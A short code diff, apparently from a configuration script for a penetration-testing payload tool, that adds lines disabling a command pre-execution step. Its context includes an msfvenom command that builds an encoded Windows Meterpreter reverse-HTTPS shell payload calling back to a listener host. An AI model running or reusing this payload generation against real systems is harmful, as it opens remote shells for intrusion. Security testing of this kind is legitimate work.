@@ -22,6 +22,10 @@ LHOST=$GLOBAL_LHOST
 # make meterpreter reverse payload, encoded with msf alpha_mixed 
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows -f raw > output/sc_alpha_mixed.txt
 
+# no command preexec
+set_command_source none
+set_command_exec none
+
 # set shellcode source
 set_payload_source from_command_line_raw
 
